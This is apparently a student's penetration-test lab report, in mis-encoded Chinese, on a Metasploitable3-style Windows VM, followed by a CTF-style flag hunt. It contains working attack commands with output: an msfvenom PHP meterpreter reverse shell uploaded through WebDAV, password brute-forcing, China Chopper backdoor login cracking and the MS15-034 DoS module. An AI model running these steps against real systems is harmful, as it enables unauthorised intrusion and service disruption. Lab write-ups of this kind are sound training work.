# æ¸—é€æµ‹è¯•æŠ¥å‘Š

æ²ˆéœæ˜€ 201250048 è½¯ä»¶å­¦é™¢

# ä¸€ã€ä¿¡æ¯æœé›†é˜¶æ®µ

1. é€šè¿‡nmapæ‰«æå‘ç°windowé¶æœºçš„ipåœ°å€`10.0.2.4`ï¼ŒPSï¼škaliæ”»å‡»æœºipï¼š10.0.2.15

2. å¯åŠ¨msfconfigï¼Œä½¿ç”¨nmapæ‰«æå…¨ç«¯å£ï¼Œå‘ç°é¶æœºå¼€å¯äº†å¦‚ä¸‹ç«¯å£ï¼ŒåŠå…¶æœåŠ¡ç‰ˆæœ¬ï¼š

   ```shell
   msf > workspace -a win08-r2
   [*] Added workspace: win08-r2
   [*] Workspace: win08-r2
   msf > db_nmap -sS -sV -sC -p- -n -v 10.0.2.4
   msf > services 
   Services
   ========
   host      port   proto  name        state  info
   ----      ----   -----  ----        -----  ----
   10.0.2.4  21     tcp    ftp         open   Microsoft ftpd
   10.0.2.4  22     tcp    ssh         open   OpenSSH 7.1 protocol 2.0
   10.0.2.4  80     tcp    http        open   Microsoft IIS httpd 7.5
   10.0.2.4  1617   tcp    java-rmi    open   Java RMI
   10.0.2.4  3000   tcp    http        open   WEBrick httpd 1.3.1 Ruby 2.3.1 (2016-04-26)
   10.0.2.4  4848   tcp    ssl/http    open   Oracle Glassfish Application Server
   10.0.2.4  5985   tcp    http        open   Microsoft HTTPAPI httpd 2.0 SSDP/UPnP
   10.0.2.4  8022   tcp    http        open   Apache Tomcat/Coyote JSP engine1.1
   10.0.2.4  8080   tcp    http        open   Sun GlassFish Open Source Edition  4.0
   10.0.2.4  8282   tcp    http        open   Apache Tomcat/Coyote JSP engine1.1
   10.0.2.4  8484   tcp    http        open   Jetty winstone-2.8
   10.0.2.4  8585   tcp    http        open   Apache httpd 2.2.21 (Win64) PHP/5.3.10 DAV/2
   10.0.2.4  9200   tcp    wap-wsp     open
   10.0.2.4  49153  tcp    msrpc       open   Microsoft Windows RPC
   10.0.2.4  49154  tcp    msrpc       open   Microsoft Windows RPC
   10.0.2.4  49179  tcp    java-rmi    open   Java RMI
   10.0.2.4  49180  tcp    tcpwrapped  open
   ```

# äºŒã€æ¼æ´åˆ†æä¸åˆ©ç”¨é˜¶æ®µ

## ï¼ˆ1ï¼‰WebDAVæœåŠ¡æ¼æ´

é€šè¿‡kaliæä¾›çš„WebDAVæœåŠ¡æ¼æ´åˆ©ç”¨å·¥å…·DAVTestã€‚è¯¥å·¥å…·ä¼šè‡ªåŠ¨æ£€æµ‹æƒé™ï¼Œå¯»æ‰¾å¯æ‰§è¡Œæ–‡ä»¶çš„æƒé™ã€‚ä¸€æ—¦å‘ç°ï¼Œç”¨æˆ·å°±å¯ä»¥ä¸Šä¼ å†…ç½®çš„åé—¨å·¥å…·ï¼Œå¯¹æœåŠ¡å™¨è¿›è¡Œæ§åˆ¶ã€‚åŒæ—¶ï¼Œè¯¥å·¥å…·å¯ä»¥ä¸Šä¼ ç”¨æˆ·æŒ‡å®šçš„æ–‡ä»¶ï¼Œä¾¿äºåæœŸåˆ©ç”¨ã€‚

```shell
rootğŸ’€kali)-[~]
â””â”€# davtest -url http://10.0.2.4:8585/uploads/                                                              
********************************************************
 Testing DAV connection
OPEN            SUCCEED:                http://10.0.2.4:8585/uploads
********************************************************
NOTE    Random string for this session: TUv6QRb
********************************************************
 Creating directory
MKCOL           SUCCEED:                Created http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb
********************************************************
 Sending test files
PUT     php     SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.php
PUT     cgi     SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.cgi
PUT     shtml   SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.shtml
PUT     jhtml   SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.jhtml
PUT     aspx    SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.aspx
PUT     jsp     SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.jsp
PUT     html    SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.html
PUT     txt     SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.txt
PUT     pl      SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.pl
PUT     asp     SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.asp
PUT     cfm     SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.cfm
********************************************************
 Checking for test file execution
EXEC    php     SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.php
EXEC    cgi     FAIL
EXEC    shtml   FAIL
EXEC    jhtml   FAIL
EXEC    aspx    FAIL
EXEC    jsp     FAIL
EXEC    html    SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.html
EXEC    txt     SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.txt
EXEC    pl      FAIL
EXEC    asp     FAIL
EXEC    cfm     FAIL
```

æ£€æµ‹å‘ç°å¯ä»¥ä¸Šä¼ phpæ–‡ä»¶

ç”Ÿæˆæ”»å‡»è½½è·å¹¶ä¸Šä¼ ï¼š

```shell
(rootğŸ’€kali)-[~]
â””â”€$ msfvenom -p php/meterpreter_reverse_tcp LHOST=10.0.2.15 LPORT=6666 -f raw >demon.php

(rootğŸ’€kali)-[~]
â””â”€$ davtest -url http://10.0.2.4:8585/uploads/ -uploadfile demon.php -uploadloc DavTestDir_12ja05EL/66.php
********************************************************
 Testing DAV connection
OPEN            SUCCEED:                http://10.0.2.4:8585/uploads
********************************************************
 unless  Uploading file
```

```shell
msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload php/meterpreter_reverse_tcp
payload => php/meterpreter_reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.0.2.15
LHOST => 10.0.2.15
msf6 exploit(multi/handler) > set LPORT 8888
LPORT => 8888
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.0.2.15:8888 
[*] Meterpreter session 1 opened (10.0.2.15:8888 -> 10.0.2.4:49914 ) at 2021-12-22 06:41:03 -0500
```

å¾—åˆ°Meterpreterï¼ŒæˆåŠŸï¼

```shell
meterpreter > help

Core Commands
=============

    Command                   Description
    -------                   -----------
    ?                         Help menu
    background                Backgrounds the current session
    bg                        Alias for background
    bgkill                    Kills a background meterpreter script
    bglist                    Lists running background scripts
    bgrun                     Executes a meterpreter script as a background thread
    channel                   Displays information or control active channels
    close                     Closes a channel
    detach                    Detach the meterpreter session (for http/https)
    disable_unicode_encoding  Disables encoding of unicode strings
    enable_unicode_encoding   Enables encoding of unicode strings
    exit                      Terminate the meterpreter session
    guid                      Get the session GUID
    help                      Help menu
    info                      Displays information about a Post module
    irb                       Open an interactive Ruby shell on the current session
    load                      Load one or more meterpreter extensions
    machine_id                Get the MSF ID of the machine attached to the session
    pry                       Open the Pry debugger on the current session
    quit                      Terminate the meterpreter session
    read                      Reads data from a channel
    resource                  Run the commands stored in a file
    run                       Executes a meterpreter script or Post module
    secure                    (Re)Negotiate TLV packet encryption on the session
    sessions                  Quickly switch to another session
    use                       Deprecated alias for "load"
    uuid                      Get the UUID for the current session
    write                     Writes data to a channel


Stdapi: File system Commands
============================

    Command       Description
    -------       -----------
    cat           Read the contents of a file to the screen
    download      Download a file or directory
    edit          Edit a file
    getlwd        Print local working directory
    lcd           Change local working directory
    lls           List local files
    lpwd          Print local working directory
    upload        Upload a file or directory


Stdapi: Networking Commands
===========================

    Command       Description
    -------       -----------
    portfwd       Forward a local port to a remote service


Stdapi: Audio Output Commands
=============================

    Command       Description
    -------       -----------
    play          play a waveform audio file (.wav) on the target system
```

## ï¼ˆ2ï¼‰sshæµ‹è¯•

1. å…¶å®ï¼Œé€šè¿‡hydraè¿›è¡Œå¯†ç çˆ†ç ´ï¼Œå¾—åˆ°Administratorè´¦å·å¯†ç ï¼šadmin321ï¼Œå³å¯å»ºç«‹sshé“¾æ¥ã€‚

   ```shell
   (rootğŸ’€kali)-[~]
   â””â”€$ ssh Administrator@10.0.2.4
   Administrator@10.0.2.4's password: 
   -sh-4.3$ 
   
   ```

2. æ£€æµ‹3389ç«¯å£ï¼Œå‘ç°ç«¯å£æ˜¯æ‰“å¼€çš„

   ```shell
   (rootğŸ’€kali)-[~]
   â””â”€$ nmap -p 3389 10.0.2.4                                                                     
   Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-17 01:57 EST
   Nmap scan report for 10.0.2.4
   Host is up (0.00034s latency).
   
   PORT     STATE    SERVICE
   3389/tcp filtered ms-wbt-server
   MAC Address: 08:00:27:0B:0C:01 (Oracle VirtualBox virtual NIC)
   
   Nmap done: 1 IP address (1 host up) scanned in 0.41 seconds
   ```

3. ç«¯å£è½¬å‘ï¼Œå¹¶è¿›è¡Œè¿æ¥

   ```shell
   (rootğŸ’€kali)-[~]
   â””â”€$ ssh -L 3389:localhost:3389 Administrator@10.0.2.4
   Administrator@10.0.2.4's password: 
   Last login: Thu Dec 16 22:54:07 2021 from 10.0.2.15
   -sh-4.3$ 
   (kaliã‰¿kali)-[~]
   â””â”€$ rdesktop 127.0.0.1:3389
   ```

   ![desktop](C:\Users\Morgan\Desktop\æ¸—é€æµ‹è¯•æŠ¥å‘Š\æ¸—é€æµ‹è¯•æŠ¥å‘Š.assets\desktop.png)

4. å®ç°å¯ä»¥ç›´æ¥åœ¨kaliæ”»å‡»æœºä¸Šè¿›è¡Œå¯¹é¶æœºçš„æ“ä½œ

ï¼ˆ3ï¼‰caidao

```shell
msf6 > search caidao

Matching Modules
================

   #  Name                                            Disclosure Date  Rank       Check  Description
   -  ----                                            ---------------  ----       -----  -----------
   0  exploit/multi/http/caidao_php_backdoor_exec     2015-10-27       excellent  Yes    China Chopper Caidao PHP Backdoor Code Execution
   1  auxiliary/scanner/http/caidao_bruteforce_login                   normal     No     Chinese Caidao Backdoor Bruteforce


Interact with a module by name or index. For example info 1, use 1 or use auxiliary/scanner/http/caidao_bruteforce_login                                                                                                        

msf6 > use auxiliary/scanner/http/caidao_bruteforce_login
msf6 auxiliary(scanner/http/caidao_bruteforce_login) > set RHOSTS 10.0.2.4
RHOSTS => 10.0.2.4
msf6 auxiliary(scanner/http/caidao_bruteforce_login) > set TARGETURI /caidao.asp
TARGETURI => /caidao.asp
msf6 auxiliary(scanner/http/caidao_bruteforce_login) > run

[-] 10.0.2.4:80 - Failed: 'admin'
[-] 10.0.2.4:80 - Failed: '123456'
[-] 10.0.2.4:80 - Failed: '12345'
[-] 10.0.2.4:80 - Failed: '123456789'
[+] 10.0.2.4:80 - Success: 'password'
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

æ‰¾åˆ°è¿æ¥å£ä»¤ï¼šâ€˜passwordâ€™

## ï¼ˆ4ï¼‰80ç«¯å£--http

MS15-034/CVE-2015-1635 HTTPè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆè¿œç¨‹è“å±ä»£ç ï¼‰

```shell
msf6 > search ms15_034

Matching Modules
================

   #  Name                                                  Disclosure Date  Rank    Check  Description
   -  ----                                                  ---------------  ----    -----  -----------
   0  auxiliary/dos/http/ms15_034_ulonglongadd                               normal  Yes    MS15-034 HTTP Protocol Stack Request Handling Denial-of-Service
   1  auxiliary/scanner/http/ms15_034_http_sys_memory_dump                   normal  Yes    MS15-034 HTTP Protocol Stack Request Handling HTTP.SYS Memory Information Disclosure


Interact with a module by name or index. For example info 1, use 1 or use auxiliary/scanner/http/ms15_034_http_sys_memory_dump                                                                                                  

msf6 > use auxiliary/dos/http/ms15_034_ulonglongadd 
msf6 auxiliary(dos/http/ms15_034_ulonglongadd) > set RHOSTS 10.0.2.4
RHOSTS => 10.0.2.4
msf6 auxiliary(dos/http/ms15_034_ulonglongadd) > show options 

Module options (auxiliary/dos/http/ms15_034_ulonglongadd):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.0.2.4         yes       The target host(s), see https://github.com/rapid7/metasploit-framewor
                                         k/wiki/Using-Metasploit
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                no        URI to the site (e.g /site/) or a valid file resource (e.g /welcome.p
                                         ng)
   THREADS    1                yes       The number of concurrent threads (max one per host)
   VHOST                       no        HTTP server virtual host

msf6 auxiliary(dos/http/ms15_034_ulonglongadd) > run

[*] DOS request sent
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(dos/http/ms15_034_ulonglongadd) > run
```

ç»“æœé¶æœºæ²¡æœ‰è“å±ï¼Œè€Œæ˜¯ç«‹å³é‡å¯äº†ï¼Œä¹Ÿè›®æœ‰è¶£çš„

# ä¸‰ã€åæ¸—é€é˜¶æ®µï¼ˆflagæŒ–æ˜ï¼‰

å¾ˆåƒæ˜¯åœ¨æ‰“CTFï¼Œåšå¾—è›®å¼€å¿ƒçš„~

## 1. the_joker

1. å‘ç°80ç«¯å£æ˜¯æ‰“å¼€çš„ï¼Œç”¨æµè§ˆå™¨æ‰“å¼€ï¼Œä¸éš¾ä»htmlé¡µé¢å‘ç°éšè—çš„HEXä»£ç ï¼Œé€šè¿‡`curl http://10.0.2.4/ > data.html
   cat data.html | perl -ne 'print $1 if(/value\=\"(\w+)\"\>/g)' > data.hex` è·å¾—hex.txtè§é™„ä»¶
   
2. ä¸éš¾çŒœæƒ³å¯ç”±hexè½¬å›¾ç‰‡ï¼Œäºæ˜¯å†™å‡ºhex2png.pyï¼Œè·å¾—flagã€‚

3. ä»£ç å¦‚ä¸‹ï¼š

   ```python
   import binascii
   
   with open('hex.txt') as f, open('data.png', 'wb')as fout:
       for line in f:
           fout.write(binascii.unhexlify(line))
   
   ```

   

![joker](C:\Users\Morgan\Desktop\æ¸—é€æµ‹è¯•æŠ¥å‘Š\æ¸—é€æµ‹è¯•æŠ¥å‘Š.assets\joker.png)

## 2. Ace_of_Hearts

1. æ‰“å¼€ç›®å½•ä¸éš¾æ‰¾åˆ°ä¸€å¼ æ™®é€šçš„çº¢æ¡ƒAï¼Œæ–‡ä»¶å¼‚å¸¸ä¹‹å¤§ï¼Œä¸éš¾å‘ç°ç«¯å€ªï¼Œå¯èƒ½æ˜¯å¤šæ–‡ä»¶éšè—ã€‚
2. æŸ¥çœ‹äºŒè¿›åˆ¶æ ¼å¼ï¼ŒæŠŠç¬¬ä¸€ä¸ªjpgæ–‡ä»¶åˆ å»ï¼Œå³å¾—åˆ°flag

![ace_of_hearts](C:\Users\Morgan\Desktop\æ¸—é€æµ‹è¯•æŠ¥å‘Š\æ¸—é€æµ‹è¯•æŠ¥å‘Š.assets\ace_of_hearts.png)

## 3.  Jack_of_Hearts

1. ä¸éš¾åœ¨documentç›®å½•ä¸‹å‘ç°Jack_of_Hearts.docxï¼Œè€ƒè™‘å•æ–‡ä»¶docxä¸­çš„PNGéšè—æ–‡ä»¶

2. å°†docxæ–‡ä»¶åç¼€æ”¹ä¸º.zipå°±ä¼šå¾—åˆ°ä¸€ä¸ªå‹ç¼©æ–‡ä»¶ï¼Œåœ¨\word\mediaä¸­å°±èƒ½æ‰¾åˆ°éšè—çš„å›¾åƒflagæ–‡ä»¶ï¼‰

![jack_of_hearts](C:\Users\Morgan\Desktop\æ¸—é€æµ‹è¯•æŠ¥å‘Š\æ¸—é€æµ‹è¯•æŠ¥å‘Š.assets\jack_of_hearts.png)

## 4. Six_of_Diamonds

1. åœ¨C:\inetpub\wwwrootç›®å½•ä¸‹ä¸éš¾æ‰¾åˆ°six_of_diamondså‹ç¼©åŒ…ï¼Œå‘ç°ç»è¿‡åŠ å¯†
2. é¦–å…ˆè€ƒè™‘æ˜¯ä¸æ˜¯ä¼ªåŠ å¯†ï¼Œå°†å…¨å±€æ–¹å¼ä½æ ‡è®°æ”¹ä¸º 00 00ï¼Œæœªèƒ½æˆåŠŸæ‰“å¼€ï¼Œè¯´æ˜ç¡®å®æœ‰å¯†ç 
3. ä½¿ç”¨ARCHPRè¿›è¡Œçˆ†ç ´ï¼Œå¯†ç ä¸ºvagrantï¼Œè·å¾—flag

![six_of_diamonds](C:\Users\Morgan\Desktop\æ¸—é€æµ‹è¯•æŠ¥å‘Š\æ¸—é€æµ‹è¯•æŠ¥å‘Š.assets\six_of_diamonds.png)

## 5. King_of_Diamonds

åœ¨C:\wamp\www\wordpress\wp-content\uploads\2017\09ç›®å½•ä¸‹ç›´æ¥æ‰¾åˆ°King_of_Diamonds.png

![king_of_damonds](C:\Users\Morgan\Desktop\æ¸—é€æµ‹è¯•æŠ¥å‘Š\æ¸—é€æµ‹è¯•æŠ¥å‘Š.assets\king_of_damonds.png)

## 6. Three_of_Spades

1. æ­¤å›¾ç‰‡æˆ‘ä¸€é€šå¥½æ‰¾ï¼Œçªç„¶æƒ³èµ·å¯èƒ½æ˜¯è¢«éšè—äº†ï¼Œæœ€ç»ˆåœ¨C:\windowsç›®å½•ä¸‹æ‰¾åˆ°äº†

2. ä½†æ˜¯ä»ç„¶æ— æ³•æ‰“å¼€ï¼ŒäºŒè¿›åˆ¶æ ¼å¼æ‰“å¼€æ ¹æ®æ–‡ä»¶å¤´çŒœæµ‹æ–‡ä»¶è¢«å¤„ç†è¿‡ï¼Œå¯¹æ–‡ä»¶å¼‚æˆ–æ“ä½œï¼Œè·å¾—æ­£å¸¸pngæ ¼å¼

3. å¤„ç†å›¾ç‰‡çš„ä»£ç ï¼š

   ```python
   #!/usr/bin/python
   _in = 'three_of_spades.png';
   _out = _in + '.out';
   
   b = bytearray(open(_in, 'rb').read())
   for i in range(len(b)):
       b[i] ^= 0x0f
   open(_out, 'wb').write(b)
   ```

   

![three_of_spades](C:\Users\Morgan\Desktop\æ¸—é€æµ‹è¯•æŠ¥å‘Š\æ¸—é€æµ‹è¯•æŠ¥å‘Š.assets\three_of_spades.png)

## 7. Seven_of_Spades

1. åœ¨Libraries\Documentsç›®å½•ä¸‹å‘ç°Seven of Spades.pdfï¼Œä¸éš¾æƒ³åˆ°æ˜¯éšè—åœ¨æ–‡ä»¶é‡Œäº†ï¼Œä½¿ç”¨pdf-parserå³å¯è·å¾—flag

![seven_of_spades](C:\Users\Morgan\Desktop\æ¸—é€æµ‹è¯•æŠ¥å‘Š\æ¸—é€æµ‹è¯•æŠ¥å‘Š.assets\seven_of_spades.png)

## 8. Four_of_Clubs

1. ç±»ä¼¼7ï¼ŒLibraries\Musicç›®å½•ä¸‹æ‰¾åˆ°Four_of_Clubs.wavï¼Œä½¿ç”¨binwalkåˆ†ç¦»å…¶ä¸­çš„flag

![four_of-clubs](C:\Users\Morgan\Desktop\æ¸—é€æµ‹è¯•æŠ¥å‘Š\æ¸—é€æµ‹è¯•æŠ¥å‘Š.assets\four_of-clubs.png)

